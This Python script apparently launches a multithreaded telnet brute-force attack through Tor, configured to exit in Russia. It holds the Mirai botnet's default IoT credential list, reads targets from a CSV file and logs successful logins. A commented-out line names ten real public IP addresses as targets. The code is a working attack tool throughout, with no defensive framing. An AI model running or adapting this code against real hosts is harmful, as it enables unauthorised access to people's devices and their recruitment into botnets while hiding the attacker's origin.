'''
@author: wardog
'''

import socket
import socks
import logging
import traceback
import time
from VErySimplePortAttackToolkit.torManager import TorManager
from VErySimplePortAttackToolkit.serviceScanner import ServiceScanner
from VErySimplePortAttackToolkit import telnetDictionaryAttack


loginPasswords =[
        ("root","xc3511"),
        ("root","vizxv"),
        ("root","admin"),
        ("admin","admin"),
        ("root","888888"),
        ("root","xmhdipc"),
        ("root","default"),
        ("root","juantech"),
        ("root","123456"),
        ("root","54321"),
        ("support","support"),
        ("root",""),
        ("admin","password"),
        ("root","root"),
        ("root","12345"),
        ("user","user"),
        ("admin",""),
        ("root","pass"),
        ("admin","admin1234"),
        ("root","1111"),
        ("admin","smcadmin"),
        ("admin","1111"),
        ("root","666666"),
        ("root","password"),
        ("root","1234"),
        ("root","klv123"),
        ("Administrator","admin"),
        ("service","service"),
        ("supervisor","supervisor"),
        ("guest","guest"),
        ("guest","12345"),
        ("guest","12345"),
        ("admin1","password"),
        ("administrator","1234"),
        ("666666","666666"),
        ("888888","888888"),
        ("ubnt","ubnt"),
        ("root","klv1234"),
        ("root","Zte521"),
        ("root","hi3518"),
        ("root","jvbzd"),
        ("root","anko"),
        ("root","zlxx."),
        ("root","7ujMko0vizxv"),
        ("root","7ujMko0admin"),
        ("root","system"),
        ("root","ikwb"),
        ("root","dreambox"),
        ("root","user"),
        ("root","realtek"),
        ("root","00000000"),
        ("admin","1111111"),
        ("admin","1234"),
        ("admin","12345"),
        ("admin","54321"),
        ("admin","123456"),
        ("admin","7ujMko0admin"),
        ("admin","1234"),
        ("admin","pass"),
        ("admin","meinsm"),
        ("tech","tech"),
        ("mother","fucker")]

if __name__ == '__main__':
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    
    handler = logging.StreamHandler()
    handler.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s %(threadName)s %(levelname)s %(filename)s %(funcName)s: %(message)s")
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    
    handler = logging.FileHandler("attack.log","a", encoding=None, delay="true")
    handler.setLevel(logging.INFO)
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    
    logger.info('Start app.')
    
    try :
               
        logger.debug('Start tor')
        torManager = TorManager('7000','ru')
        torManager.connect() 
        
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 7000, True)
        socket.socket = socks.socksocket          
        
        logger.debug('Init attack')
        #serviceAttack = telnetDictionaryAttack.TelnetDictionaryAttack(loginPasswords , ["5.206.211.123:23","92.81.49.221:23","186.117.116.87:23","183.88.9.138:23","201.56.23.1:23","218.207.8.26:23","79.134.150.80:23","146.255.238.19:23","140.136.25.90:23","64.92.6.251:23"] , 11,3,10)
        serviceAttack = telnetDictionaryAttack.TelnetDictionaryAttack(dictionary = loginPasswords , listTargets = "targets.csv" , nbThread=20,timeOut=3,timeOutPassword=10, targetsResultFile='targetsResults.csv')
        
        logger.debug('Start attack')
        serviceAttack.startAttack()
        logger.debug('Attack started')
        
    except:
        logger.error("Error occurs : " + traceback.format_exc())
    
    finally:
        """time.sleep(10)
        
        serviceAttack.stopAttack()
        
        time.sleep(1)
        torManager.disconnect()"""
        
        logger.info('Quit app.')
        
        
        
